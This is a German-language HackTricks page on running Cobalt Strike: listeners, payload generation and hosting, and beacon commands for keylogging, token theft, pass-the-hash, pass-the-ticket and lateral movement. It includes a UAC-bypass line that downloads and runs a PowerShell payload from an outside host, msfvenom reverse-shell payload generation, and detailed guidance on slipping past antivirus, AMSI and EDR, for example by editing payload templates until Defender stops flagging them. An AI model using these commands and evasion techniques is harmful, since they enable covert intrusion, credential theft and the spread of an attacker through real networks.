# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listener

### C2 Listener

`Cobalt Strike -> Listeners -> Add/Edit`, dann kannst du auswählen, wo gelauscht werden soll, welche Art von beacon verwendet werden soll (http, dns, smb ...) und mehr.

### Peer2Peer Listener

Die beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren, sondern können über andere beacons mit ihm kommunizieren.

`Cobalt Strike -> Listeners -> Add/Edit`, dann musst du die TCP- oder SMB-beacons auswählen.

* Der **TCP beacon richtet einen Listener auf dem ausgewählten Port ein**. Um eine Verbindung zu einem TCP beacon herzustellen, verwende den Befehl `connect <ip> <port>` von einem anderen beacon aus.
* Der **SMB beacon lauscht in einer pipename mit dem ausgewählten Namen**. Um eine Verbindung zu einem SMB beacon herzustellen, musst du den Befehl `link [target] [pipe]` verwenden.

### Payloads generieren und hosten

#### Payloads in Dateien generieren

`Attacks -> Packages ->`

* **`HTMLApplication`** für HTA-Dateien
* **`MS Office Macro`** für ein Office-Dokument mit einem Macro
* **`Windows Executable`** für eine .exe, .dll oder Service-.exe
* **`Windows Executable (S)`** für eine **stageless** .exe, .dll oder Service-.exe (stageless ist besser als staged, da weniger IoCs entstehen)

#### Payloads generieren und hosten

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` generiert ein Script/eine ausführbare Datei, um den beacon von Cobalt Strike in Formaten wie bitsadmin, exe, powershell und python herunterzuladen.

#### Payloads hosten

Wenn du die Datei, die du auf einem Webserver hosten möchtest, bereits hast, gehe einfach zu `Attacks -> Web Drive-by -> Host File` und wähle die zu hostende Datei sowie die Konfiguration des Webservers aus.

### Beacon-Optionen

<details>
<summary>Beacon-Optionen und Befehle</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Ein custom agent muss lediglich das HTTP/S-Protokoll des Cobalt Strike Team Servers (standardmäßiges malleable C2 profile) unterstützen, um sich zu registrieren/einzuchecken und Tasks zu empfangen. Implementiere dieselben im Profile definierten URIs/Headers/Metadata-Verschlüsselungen, um die Cobalt-Strike-Oberfläche für Tasking und die Ausgabe wiederzuverwenden.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Ein Aggressor Script (z. B. `CustomBeacon.cna`) kann die Payload-Generierung für den Nicht-Windows-Beacon kapseln, sodass Operatoren den Listener auswählen und ELF-Payloads direkt über die GUI erzeugen können.
- Beispielhafte Linux-Task-Handler, die dem Team Server bereitgestellt werden: `sleep`, `cd`, `pwd`, `shell` (beliebige Befehle ausführen), `ls`, `upload`, `download` und `exit`. Diese werden auf die vom Team Server erwarteten Task-IDs abgebildet und müssen serverseitig implementiert werden, um die Ausgabe im korrekten Format zurückzugeben.
- BOF-Unterstützung unter Linux kann durch das In-Process-Laden von Beacon Object Files mit [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) hinzugefügt werden (unterstützt auch Outflank-style BOFs). Dadurch kann modulare Post-Exploitation im Kontext und mit den Privilegien des Implants ausgeführt werden, ohne neue Prozesse zu starten.<sup>[[2]](#references)[[3]](#references)</sup>
- Bette einen SOCKS-Handler in den custom beacon ein, um beim Pivoting Parität mit Windows Beacons zu erreichen: Wenn der Operator `socks <port>` ausführt, sollte das Implant einen lokalen Proxy öffnen, um Operator-Tools über den kompromittierten Linux-Host in interne Netzwerke zu routen.

## Opsec

### Execute-Assembly

**`execute-assembly`** verwendet einen **sacrificial process**, der Remote Process Injection nutzt, um das angegebene Programm auszuführen. Dies ist sehr auffällig, da für die Injection in einen Prozess bestimmte Win APIs verwendet werden, die von jedem EDR überprüft werden. Es gibt jedoch einige custom Tools, mit denen etwas im selben Prozess geladen werden kann:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kannst du außerdem BOF (Beacon Object Files) verwenden: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Das Aggressor Script `https://github.com/outflanknl/HelpColor` erstellt den Befehl `helpx` in Cobalt Strike. Dieser versieht Befehle mit Farben, die anzeigen, ob es sich um BOFs (grün), um Frok&Run (gelb) und Ähnliches oder um ProcessExecution, Injection oder Ähnliches (rot) handelt. Dies hilft dabei zu erkennen, welche Befehle stealthier sind.

### Modern in-process post-execution

Neuere Versionen bieten zwei Alternativen, wenn ein klassischer COFF BOF zu eingeschränkt ist:

- **Beacon Interpreter** kompiliert C auf dem Team Server in Intermediate Bytecode und führt diesen in einer in Beacon eingebetteten VM aus. Der Bytecode bleibt Daten statt nativer ausführbarer Code zu sein. Dadurch entfallen die zusätzliche Allokation von ausführbarem Speicher und der normalerweise zum Laden eines BOF erforderliche Wechsel der Berechtigungen von RW zu RX. Scripts können die Beacon API importieren und BOF-style Dynamic Function Resolution (DFR)-Prototypen deklarieren.
- **BOF-PE** lädt eine vollständige EXE oder DLL in den aktuellen Beacon. Dieses Format unterstützt normale PE-Imports, Exception Handling, umfangreicheren C++-Code und externe Libraries und behält dabei die Beacon API bei. Dies ist umfangreicher als ein kleines COFF BOF. Verwende es daher nur, wenn die zusätzliche Runtime benötigt wird.
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
Diese Mechanismen reduzieren loader-bezogene Signale, nicht die durch die Aktionen des Scripts oder Windows-API-Aufrufe erzeugte Telemetrie.<sup>[[8]](#references)</sup>

### Als Benutzer agieren

Du könntest Ereignisse wie `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` überprüfen:

- Security EID 4624 - Überprüfe alle interaktiven Logons, um die üblichen Betriebszeiten zu ermitteln.
- System EID 12,13 - Überprüfe die Häufigkeit von Herunterfahren/Starten/Standby.
- Security EID 4624/4625 - Überprüfe eingehende gültige/ungültige NTLM-Versuche.
- Security EID 4648 - Dieses Ereignis wird erstellt, wenn Klartext-Credentials für einen Logon verwendet werden. Wenn es von einem Prozess erzeugt wurde, enthält die Binärdatei möglicherweise die Credentials im Klartext in einer Konfigurationsdatei oder im Code.

Bei der Verwendung von `jump` aus Cobalt Strike ist es besser, die Methode `wmi_msbuild` zu verwenden, damit der neue Prozess legitimer aussieht.

### Computer-Accounts verwenden

Für Defender ist es üblich, nach ungewöhnlichem Verhalten von Benutzern zu suchen und **Service-Accounts sowie Computer-Accounts wie `*$` aus ihrer Überwachung auszuschließen**. Du könntest diese Accounts für laterale Bewegungen oder Privilege Escalation verwenden.

### Stageless Payloads verwenden

Stageless Payloads erzeugen weniger Aufsehen als gestagete Payloads, da sie keine zweite Stage vom C2-Server herunterladen müssen. Das bedeutet, dass sie nach der initialen Verbindung keinen weiteren Netzwerkverkehr erzeugen, wodurch sie von netzwerkbasierten Defenses weniger wahrscheinlich erkannt werden.

### Tokens & Token Store

Sei beim Stehlen oder Generieren von Tokens vorsichtig, da ein EDR Thread-Tokens enumerieren und einen **Token erkennen kann, der zu einem anderen Benutzer gehört** oder sogar SYSTEM innerhalb des Prozesses.

Dadurch können Tokens **pro Beacon** gespeichert werden, sodass derselbe Token nicht immer wieder gestohlen werden muss. Dies ist für laterale Bewegungen nützlich oder wenn du einen gestohlenen Token mehrfach verwenden musst:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Bei lateralen Bewegungen ist es normalerweise besser, **einen Token zu stehlen, statt einen neuen zu generieren** oder einen pass-the-hash-Angriff durchzuführen.

### Guardrails

Cobalt Strike verfügt über eine Funktion namens **Guardrails**, die dabei hilft, die Verwendung bestimmter Befehle oder Aktionen zu verhindern, die von Defendern erkannt werden könnten. Guardrails können so konfiguriert werden, dass bestimmte Befehle wie `make_token`, `jump`, `remote-exec` und andere blockiert werden, die häufig für laterale Bewegungen oder Privilege Escalation verwendet werden.

Darüber hinaus enthält das Repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ebenfalls einige Checks und Ideen, die du vor dem Ausführen eines Payloads berücksichtigen könntest.

### Verschlüsselung von Tickets

Achte in einer AD-Umgebung auf die Verschlüsselung der Tickets. Standardmäßig verwenden einige Tools RC4-Verschlüsselung für Kerberos-Tickets, die weniger sicher als AES-Verschlüsselung ist, und aktuelle Umgebungen verwenden standardmäßig AES. Dies kann von Defendern erkannt werden, die auf schwache Verschlüsselungsalgorithmen überwachen.

### Defaults vermeiden

Bei der standardmäßigen Verwendung von Cobalt Stricke heißen die SMB-Pipes `msagent_####` und `"status_####"`. Ändere diese Namen. Die Namen der vorhandenen Pipes können in Cobal Strike mit dem Befehl `ls \\.\pipe\` überprüft werden.

Bei SSH-Sessions wird außerdem eine Pipe namens `\\.\pipe\postex_ssh_####` erstellt. Ändere sie mit `set ssh_pipename "<new_name>";`.

Auch bei einem poext exploitation attack können die Pipes `\\.\pipe\postex_####` mit `set pipename "<new_name>"` geändert werden.

In Cobalt-Strike-Profilen kannst du außerdem Dinge wie Folgendes ändern:

- Die Verwendung von `rwx` vermeiden
- Das Verhalten der process injection festlegen, also welche APIs im Block `process-inject {...}` verwendet werden
- Festlegen, wie "fork and run" im Block `post-ex {…}` funktioniert
- Die sleep time
- Die maximale Größe der Binärdateien, die in den Speicher geladen werden
- Den Memory Footprint und den DLL-Inhalt mit dem Block `stage {...}`
- Den Netzwerkverkehr

### Sleepmask und BeaconGate

Eine Sleepmask transformiert Beacon und seine nachverfolgten Heap-Allokationen, während es inaktiv ist, und stellt sie für die Ausführung von Tasks wieder her. Aktuelle Releases bieten standardmäßig eine evasive Variante, aber benutzerdefinierte Sleepmask BOFs bleiben nützlich, wenn sich Anforderungen an Memory Layout, Allokation oder Call Stack unterscheiden. Seit 4.13 fälscht die standardmäßige Sleepmask außerdem die Return Address für APIs, die über BeaconGate weitergeleitet werden.<sup>[[8]](#references)</sup>

**BeaconGate** erweitert dieses Design über `Sleep` hinaus: Ausgewählte WinAPI-Aufrufe werden als `FUNCTION_CALL`-Strukturen dargestellt und an die Sleepmask BOF weitergeleitet, die Beacon während der Ausführung des Aufrufs maskieren kann. Im Profil kann eine Gruppe (`Comms`, `Core`, `Cleanup` oder `All`) oder nur einzelne APIs gegated werden:<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
Für eine unter `beacon_gate` aufgeführte API hat der Gate Vorrang vor `syscall_method`; nicht aufgeführte APIs können weiterhin die konfigurierte syscall-Methode verwenden. `beacon_gate disable` und `beacon_gate enable` schalten das Feature zur Laufzeit um. Vermeide es, `All` blind zu aktivieren: Befehle wie `ps` rufen wiederholt `OpenProcess`/`CloseHandle` auf und können eine CPU-Spitze verursachen, wenn jeder Aufruf Beacon maskiert und die Maskierung wieder aufhebt. Sleepmask-VS stellt einen simulierten Beacon-/Sleepmask-Zustand zum Debuggen benutzerdefinierter Gates bereit, ohne sie wiederholt über ein aktives Implantat testen zu müssen.<sup>[[9]](#references)</sup>

### Laute Proc-Injections

Beim Injizieren von Code in einen Prozess ist dies normalerweise sehr auffällig, da **kein regulärer Prozess diese Aktion normalerweise ausführt und die Möglichkeiten dafür sehr begrenzt sind**. Daher könnte dies von verhaltensbasierten Erkennungssystemen erkannt werden. Außerdem könnte es von EDRs erkannt werden, die das Netzwerk nach **Threads mit Code durchsuchen, der nicht auf der Festplatte vorhanden ist** (obwohl Prozesse wie Browser, die JIT verwenden, dies häufig tun). Beispiel: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID- und PPID-Beziehungen

Beim Starten eines neuen Prozesses ist es wichtig, eine **reguläre Parent-Child-Beziehung** zwischen den Prozessen **beizubehalten**, um eine Erkennung zu vermeiden. Wenn svchost.exec iexplorer.exe ausführt, wirkt dies verdächtig, da svchost.exe in einer normalen Windows-Umgebung kein Parent von iexplorer.exe ist.

Wenn in Cobalt Strike standardmäßig ein neuer Beacon gestartet wird, wird ein Prozess mit **`rundll32.exe`** erstellt, um den neuen Listener auszuführen. Dies ist nicht besonders stealthy und kann von EDRs leicht erkannt werden. Außerdem wird `rundll32.exe` ohne Argumente ausgeführt, was noch verdächtiger wirkt.

Mit dem folgenden Cobalt-Strike-Befehl kannst du einen anderen Prozess angeben, der den neuen Beacon startet, wodurch er schwerer erkennbar wird:
```bash
spawnto x86 svchost.exe
```
Du kannst diese Einstellung **`spawnto_x86` und `spawnto_x64`** auch in einem Profil ändern.

### Proxying des Angreifer-Traffics

Angreifer müssen manchmal in der Lage sein, Tools lokal auszuführen, selbst auf Linux-Rechnern, und den Traffic der Opfer das Tool erreichen zu lassen (z. B. für ein NTLM relay).

Außerdem ist es bei einem pass-the-hash- oder pass-the-ticket-Angriff manchmal unauffälliger für den Angreifer, **diesen Hash oder dieses Ticket in seinen eigenen LSASS-Prozess** lokal einzufügen und anschließend darüber zu pivotieren, anstatt einen LSASS-Prozess auf dem Rechner des Opfers zu verändern.

Du musst jedoch **mit dem erzeugten Traffic vorsichtig sein**, da du möglicherweise ungewöhnlichen Traffic (Kerberos?) von deinem Backdoor-Prozess sendest. Dafür könntest du zu einem Browser-Prozess pivotieren (obwohl du beim Injizieren in einen Prozess entdeckt werden könntest; überlege dir daher eine unauffällige Vorgehensweise).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Siehe die Seite:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Normalerweise findest du unter `/opt/cobaltstrike/artifact-kit` den Code und vorkompilierte Templates (in `/src-common`) für die Payloads, die Cobalt Strike zur Erstellung der Binary Beacons verwendet.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand des generierten Backdoors (oder nur des kompilierten Templates) herausfinden, was Defender auslöst. Das ist normalerweise ein String. Daher kannst du einfach den Code ändern, der das Backdoor generiert, sodass dieser String nicht in der finalen Binary erscheint.

Nachdem du den Code geändert hast, führe einfach `./build.sh` aus demselben Verzeichnis aus und kopiere den Ordner `dist-pipe/` in den Windows-Client nach `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Vergiss nicht, das aggressive Script `dist-pipe\artifact.cna` zu laden, damit Cobalt Strike die gewünschten Ressourcen von der Festplatte verwendet und nicht die geladenen.

#### Resource Kit

Der Ordner ResourceKit enthält die Vorlagen für die scriptbasierten Payloads von Cobalt Strike, einschließlich PowerShell, VBA und HTA.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand der Vorlagen herausfinden, was Defender (in diesem Fall AMSI) nicht akzeptiert, und es entsprechend ändern:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifying the erkannten Zeilen kann man ein Template erzeugen, das nicht erkannt wird.

Vergiss nicht, das aggressive Script `ResourceKit\resources.cna` zu laden, damit Cobalt Strike die gewünschten Ressourcen von der Festplatte verwendet und nicht die bereits geladenen.

#### Function hooks | Syscall

Function hooking ist eine sehr häufige Methode von EDRs, um bösartige Aktivitäten zu erkennen. Cobalt Strike ermöglicht es, diese Hooks zu umgehen, indem **syscalls** anstelle der standardmäßigen Windows-API-Aufrufe verwendet werden. Dazu kann die Konfiguration **`None`** genutzt werden, die `Nt*`-Version einer Funktion mit der Einstellung **`Direct`**, oder mit der Option **`Indirect`** im malleable profile einfach über die `Nt*`-Funktion gesprungen werden. Je nach System kann eine Option stealthier als eine andere sein.

Dies kann im profile oder mit dem Befehl **`syscall-method`** festgelegt werden.

Dies kann jedoch ebenfalls auffällig sein.

Eine von Cobalt Strike bereitgestellte Möglichkeit, Function hooks zu umgehen, besteht darin, diese mit [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) zu entfernen.

Du kannst auch mit [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) oder [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) überprüfen, welche Funktionen gehookt sind.




<details>
<summary>Verschiedene Cobalt Strike-Befehle</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (benutzerdefinierter Implantat-PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF-Vorlage](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42-Analyse der Metadatenverschlüsselung von Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS-ISC-Tagebucheintrag zum Cobalt-Strike-Datenverkehr](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: In der Übersetzung verloren](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Durch das BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
